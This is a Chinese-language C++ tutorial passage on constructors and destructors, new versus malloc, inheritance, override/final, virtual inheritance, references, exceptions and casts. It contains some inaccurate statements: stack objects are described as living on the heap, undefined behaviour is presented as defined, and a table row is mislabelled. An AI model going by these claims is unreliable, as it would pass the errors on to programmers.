<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">A</span>() &#123; <span class="built_in">LOG_INFO</span>(<span class="string">&quot;~A() destructor&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">B</span>() &#123; <span class="built_in">LOG_INFO</span>(<span class="string">&quot;~B() destructor&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">C</span>() &#123; <span class="built_in">LOG_INFO</span>(<span class="string">&quot;~C() destructor&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">D</span>() &#123; <span class="built_in">LOG_INFO</span>(<span class="string">&quot;~C() destructor&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    A *var1 = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    <span class="keyword">delete</span> var1;        <span class="comment">// 调用B的析构函数后调用A的析构函数</span></span><br><span class="line"></span><br><span class="line">    C *var2 = <span class="keyword">new</span> <span class="built_in">D</span>();</span><br><span class="line">    <span class="keyword">delete</span> var2;        <span class="comment">// 仅调用C的析构函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用和不适用-new"><a href="#使用和不适用-new" class="headerlink" title="使用和不适用 new"></a>使用和不适用 new</h4><ol>
<li>用类名创建对象，相当于局部变量，变量在栈上，系统自动销毁。</li>
<li>使用 new 创建对象，在堆上申请内存，返回指针，需要 delete 进行销毁。</li>
</ol>
<h4 id="加不加括号的区别"><a href="#加不加括号的区别" class="headerlink" title="加不加括号的区别"></a>加不加括号的区别</h4><ul>
<li>类名 对象名<ul>
<li>默认调用“对象名()”这个构造函数，在栈内存中存在对象名，在堆内存中存在实际对象；</li>
</ul>
</li>
<li>类名 对象名()<ul>
<li>相当于定义了一个返回值为类的函数，没有任何意义；</li>
</ul>
</li>
<li>类名 对象名(一个或以上个参数)<ul>
<li>默认调用相应的构造函数，在栈内存中存在对象名，在堆内存中也是存在实际对象的；</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() = <span class="keyword">default</span>;</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a1;       <span class="comment">//调用A()实例化对象</span></span><br><span class="line">    <span class="function">A <span class="title">a2</span><span class="params">()</span></span>;     <span class="comment">//定义返回值为A的函数，没有意义</span></span><br><span class="line">    <span class="function">A <span class="title">a3</span><span class="params">(<span class="number">5</span>)</span></span>;    <span class="comment">//调用A(int n)实例化对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="参数是否初始化"><a href="#参数是否初始化" class="headerlink" title="参数是否初始化"></a>参数是否初始化</h4><h5 id="使用-new"><a href="#使用-new" class="headerlink" title="使用 new"></a>使用 new</h5><ul>
<li>new 一个对象不加括号，如果有默认构造函数则会初始化；没有默认构造函数相当于只分配了内存，灭有初始化</li>
<li>new 一个对象加括号，有默认构造函数或者没有构造函数会初始化，但是写空的构造函数不会初始化</li>
<li>带参数的构造函数会先调用不带参数的默认构造函数，参数是否初始化同上</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> m_a;</span><br><span class="line">    <span class="built_in">A</span>() = <span class="keyword">default</span>;</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> n)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> m_b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> m_c;</span><br><span class="line">    <span class="built_in">C</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">C</span>(<span class="type">int</span> n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span>* arg[])</span> </span>&#123;</span><br><span class="line">    A *pA1 = <span class="keyword">new</span> A;</span><br><span class="line">    A *pA2 = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    A *pA3 = <span class="keyword">new</span> <span class="built_in">A</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;A *pA1 = new A;&#x27; is at 0x%p, a %d&quot;</span>, pA1, pA1-&gt;m_a);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;A *pA2 = new A();&#x27; is at 0x%p, a %d&quot;</span>, pA2, pA2-&gt;m_a);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;A *pA3 = new A(5);&#x27; is at 0x%p, a %d&quot;</span>, pA3, pA3-&gt;m_a);</span><br><span class="line"></span><br><span class="line">    B *pB1 = <span class="keyword">new</span> B;</span><br><span class="line">    B *pB2 = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;B *pB1 = new B;&#x27; is at 0x%p, b %d&quot;</span>, pB1, pB1-&gt;m_b);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;B *pB2 = new B();&#x27; is at 0x%p, b %d&quot;</span>, pB2, pB2-&gt;m_b);</span><br><span class="line"></span><br><span class="line">    C *pC1 = <span class="keyword">new</span> C;</span><br><span class="line">    C *pC2 = <span class="keyword">new</span> <span class="built_in">C</span>();</span><br><span class="line">    C *pC3 = <span class="keyword">new</span> <span class="built_in">C</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;C *pC1 = new C;&#x27; is at 0x%p, c %d&quot;</span>, pC1, pC1-&gt;m_c);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;C *pC2 = new C();&#x27; is at 0x%p, c %d&quot;</span>, pC2, pC2-&gt;m_c);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;&#x27;C *pC3 = new C(5);&#x27; is at 0x%p, c %d&quot;</span>, pC3, pC3-&gt;m_c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> pA1;</span><br><span class="line">    <span class="keyword">delete</span> pA2;</span><br><span class="line">    <span class="keyword">delete</span> pA3;</span><br><span class="line">    <span class="keyword">delete</span> pB1;</span><br><span class="line">    <span class="keyword">delete</span> pB2;</span><br><span class="line">    <span class="keyword">delete</span> pC1;</span><br><span class="line">    <span class="keyword">delete</span> pC2;</span><br><span class="line">    <span class="keyword">delete</span> pC3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;A *pA1 = new A;&#x27; is at 0x0x55575e582e70, a 0</span><br><span class="line">&#x27;A *pA2 = new A();&#x27; is at 0x0x55575e582e90, a 0</span><br><span class="line">&#x27;A *pA3 = new A(5);&#x27; is at 0x0x55575e582eb0, a 0</span><br><span class="line">&#x27;B *pB1 = new B;&#x27; is at 0x0x55575e583590, b 1413816944</span><br><span class="line">&#x27;B *pB2 = new B();&#x27; is at 0x0x55575e5835b0, b 0</span><br><span class="line">&#x27;C *pC1 = new C;&#x27; is at 0x0x55575e5835d0, c 1413815456</span><br><span class="line">&#x27;C *pC2 = new C();&#x27; is at 0x0x55575e5835f0, c 1413815456</span><br><span class="line">&#x27;C *pC3 = new C(5);&#x27; is at 0x0x55575e583610, c 1413815456</span><br></pre></td></tr></table></figure>

<h3 id="1-3-new-和-malloc-的区别"><a href="#1-3-new-和-malloc-的区别" class="headerlink" title="1.3. new 和 malloc 的区别"></a>1.3. new 和 malloc 的区别</h3><table>
<thead>
<tr>
<th>特征</th>
<th>new&#x2F;delete</th>
<th>malloc&#x2F;free</th>
</tr>
</thead>
<tbody><tr>
<td>分配内存的位置</td>
<td>自由存储区</td>
<td>堆</td>
</tr>
<tr>
<td>内存分配失败返回值</td>
<td>完整类型指针</td>
<td><code>void*</code></td>
</tr>
<tr>
<td>内存分配失败返回值</td>
<td>默认抛出异常</td>
<td>返回 NULL</td>
</tr>
<tr>
<td>分配内存的大小</td>
<td>由编译器根据类型计算得出</td>
<td>必须显式指定字节数</td>
</tr>
<tr>
<td>处理数组</td>
<td>有处理数组的 new 版本 new[]</td>
<td>需要用户计算数组的大小后进行内存分配</td>
</tr>
<tr>
<td>已分配内存的扩充</td>
<td>无法直观地处理</td>
<td>使用 realloc 简单完成</td>
</tr>
<tr>
<td>是否相互调用</td>
<td>可以，看具体的 operator new&#x2F;delete 实现</td>
<td>不可调用 new</td>
</tr>
<tr>
<td>分配内存时内存不足</td>
<td>客户能够指定处理函数或重新制定分配器</td>
<td>无法通过用户代码进行处理</td>
</tr>
<tr>
<td>函数重载</td>
<td>允许</td>
<td>不允许</td>
</tr>
<tr>
<td>构造函数与析构函数</td>
<td>调用</td>
<td>不调用</td>
</tr>
</tbody></table>
<h3 id="1-4-继承"><a href="#1-4-继承" class="headerlink" title="1.4. 继承"></a>1.4. 继承</h3><h4 id="1-构造函数"><a href="#1-构造函数" class="headerlink" title="(1) 构造函数"></a>(1) 构造函数</h4><ul>
<li>子类会默认调用父类的无参构造函数</li>
<li>父类的有参构造函数不会默认继承，需要显示声明，可以用下面两种方式<ul>
<li>child(int i) : father(i) {}</li>
<li>using father:father;</li>
</ul>
</li>
</ul>
<h4 id="2-virtual"><a href="#2-virtual" class="headerlink" title="(2) virtual"></a>(2) virtual</h4><ul>
<li>virtual 定义的函数会在调用时，根据指针找到子类实现去调用</li>
<li>private 函数，可以使用 virtual，虽然子类无法访问，但是不影响重写</li>
<li>纯虚函数必须在子类中声明，不能只实现</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;class A, func&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">privFunc</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;class A, privFunc&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">pureFunc</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A, <span class="keyword">public</span> C &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;class B, func&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pureFunc</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;class B, pureFunc&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">privFunc</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;class B, privFunc&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    a-&gt;<span class="built_in">func</span>(); <span class="comment">// 调用A的实现</span></span><br><span class="line">    A *b = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    b-&gt;<span class="built_in">func</span>(); <span class="comment">// 虽然指针是A，但是调用B的实现</span></span><br><span class="line">    C *c = <span class="keyword">new</span> <span class="built_in">C</span>();     <span class="comment">// 此行编译不过，类存在纯虚函数，无法初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-override-编译时检查重写"><a href="#3-override-编译时检查重写" class="headerlink" title="(3) override 编译时检查重写"></a>(3) override 编译时检查重写</h4><ul>
<li>override 是可以在编译期检查是否是重写了父类的函数，要求父类必须是 virtual 定义的函数</li>
<li>override 函数可以再次在子类被 override 掉</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 定义纯虚接口函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">override</span> </span>&#123;&#125;  <span class="comment">// 报错，因为父类没有此函数的virtual定义</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;&#125;    <span class="comment">// 父类的函数是override，子类可以再次override，不需要父类定义virtual</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-final-禁止继承-重写"><a href="#4-final-禁止继承-重写" class="headerlink" title="(4) final 禁止继承&#x2F;重写"></a>(4) final 禁止继承&#x2F;重写</h4><ul>
<li>final类禁止继承</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">final</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;&#125;;  <span class="comment">// 编译报错，final类禁止继承</span></span><br></pre></td></tr></table></figure>

<ul>
<li>final方法禁止重写</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> <span class="keyword">final</span> </span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;&#125;;    <span class="comment">// 报错，因为函数在B中定义了final</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-虚继承"><a href="#5-虚继承" class="headerlink" title="(5) 虚继承"></a>(5) 虚继承</h4><ul>
<li>先看代码</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;A()&quot;</span>);</span><br><span class="line">        m_a = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> m_a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>() &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;B()&quot;</span>);</span><br><span class="line">        m_a = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> m_b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">C</span>() &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;C()&quot;</span>);</span><br><span class="line">        m_a = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> m_c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> B, <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">D</span>() &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;D()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, m_a);  <span class="comment">// 编译报错 &quot;D::m_a&quot; is ambiguous</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, B::m_a);  <span class="comment">// 这样就没问题</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    D d;</span><br><span class="line">    d.<span class="built_in">func</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这时D调用属性<code>m_a</code>是从B继承来的还是从C继承来的就会造成歧义，直接调用编译器会报错，不知道从谁而来。</li>
<li>指定从谁来的就不会有问题，可以理解为下图的关系，其实是有两个A</li>
</ul>
<img src="2023-02-12-01.png" />

<ul>
<li>构造函数调用也是<code>A -&gt; B -&gt; A -&gt; C -&gt; D</code></li>
<li>而使用virtual继承后</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> B, <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">D</span>() &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;D()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, m_a);  <span class="comment">// 这样就没问题</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>构造函数调用顺序<code>A -&gt; B -&gt; C -&gt; D</code>，可以看出A只有一份，也就是下图的样子</li>
</ul>
<img src="2023-02-12-02.png" />

<h2 id="2-引用"><a href="#2-引用" class="headerlink" title="2. 引用"></a>2. 引用</h2><h3 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h3><table>
<thead>
<tr>
<th>指针 <code>*</code></th>
<th>引用 <code>&amp;</code></th>
</tr>
</thead>
<tbody><tr>
<td>可以指向空地址</td>
<td>不可为空</td>
</tr>
<tr>
<td>变量，储存地址，初始化后可变</td>
<td>就是所引用的变量，初始化后不可变</td>
</tr>
<tr>
<td>可以有多级，如<code>**p</code></td>
<td>只有一级</td>
</tr>
<tr>
<td>sizeof 为指针变量的大小</td>
<td>sizeof 为对象大小</td>
</tr>
</tbody></table>
<h2 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="3. 异常处理"></a>3. 异常处理</h2><h3 id="3-1-抛出异常和捕获异常"><a href="#3-1-抛出异常和捕获异常" class="headerlink" title="3.1. 抛出异常和捕获异常"></a>3.1. 抛出异常和捕获异常</h3><ul>
<li>抛出异常可以使用任意类型，包括内置类型，也可以抛出一个异常类</li>
<li>使用<code>...</code>可以捕获所有异常</li>
<li>使用<code>throw</code>语句，类的析构函数会被调用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抛出异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">MyError</span>(<span class="string">&quot;Something bad happened&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//捕获异常</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//会造成异常的程序</span></span><br><span class="line">&#125; <span class="built_in">catch</span>(type1 id1) &#123;</span><br><span class="line">    <span class="comment">//处理type1类型的异常</span></span><br><span class="line">&#125; <span class="built_in">catch</span>(type2 id2) &#123;</span><br><span class="line">    <span class="comment">//处理type2类型的异常</span></span><br><span class="line">&#125; <span class="built_in">catch</span>(...) &#123;</span><br><span class="line">    <span class="comment">//处理所有类型的异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-重新抛出异常"><a href="#3-2-重新抛出异常" class="headerlink" title="3.2. 重新抛出异常"></a>3.2. 重新抛出异常</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">catch</span> (...) &#123;</span><br><span class="line">    <span class="comment">//做一些处理工作，然后将异常重新抛出到上一级</span></span><br><span class="line">    <span class="keyword">throw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>如果异常抛出一个类，将抛出一个类的拷贝，所以此类必须可拷贝</li>
<li>如果异常抛出一个派生类，捕获使用基类可以捕获基类和所有派生类的异常，通常将派生类的捕获放在前面，基类的捕获放在最后用于捕获其他不常用的所有派生类的异常</li>
</ul>
<h3 id="3-3-terminator"><a href="#3-3-terminator" class="headerlink" title="3.3. terminator()"></a>3.3. terminator()</h3><ul>
<li>当没有一个异常处理器捕获某种异常的时候，<code>terminator()</code>会被调用</li>
<li>当析构函数中抛出异常时，<code>terminator()</code>会被调用</li>
</ul>
<h4 id="set-terminator"><a href="#set-terminator" class="headerlink" title="set_terminator()"></a>set_terminator()</h4><ul>
<li>用户可以自定义<code>void terminator()</code>函数</li>
<li>首次调用会返回默认的函数指针</li>
</ul>
<p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">terminator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;I&#x27;ll be back!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">void</span> (*old_terminate)() = <span class="built_in">set_terminate</span>(terminator);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Botch</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Botch::f()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">Fruit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Botch</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;~Botch()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Botch b;</span><br><span class="line">        b.<span class="built_in">f</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Inside catch(...)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Botch::f()</span><br><span class="line">~Botch()</span><br><span class="line">I&#x27;ll be back!</span><br></pre></td></tr></table></figure>

<h2 id="4-显式转换"><a href="#4-显式转换" class="headerlink" title="4. 显式转换"></a>4. 显式转换</h2><ul>
<li>C++对类型转换有下面几种专门的类进行转换，使用 C 语言的强制转换在编译时可能会报错</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static_cast</span>&lt;new_type&gt;      (expression)</span><br><span class="line"><span class="built_in">dynamic_cast</span>&lt;new_type&gt;     (expression)</span><br><span class="line"><span class="built_in">const_cast</span>&lt;new_type&gt;       (expression)</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;new_type&gt; (expression)</span><br></pre></td></tr></table></figure>

<h3 id="static-cast"><a href="#static-cast" class="headerlink" title="static_cast"></a><code>static_cast</code></h3><ul>
<li>基本类型转换，不能用于不同指针类型的转换</li>
<li>不能去除<code>const</code>、<code>volatile</code>、<code>__unaligned</code>属性</li>
<li>可以将<code>void *</code>转成其他类型的指针</li>
</ul>
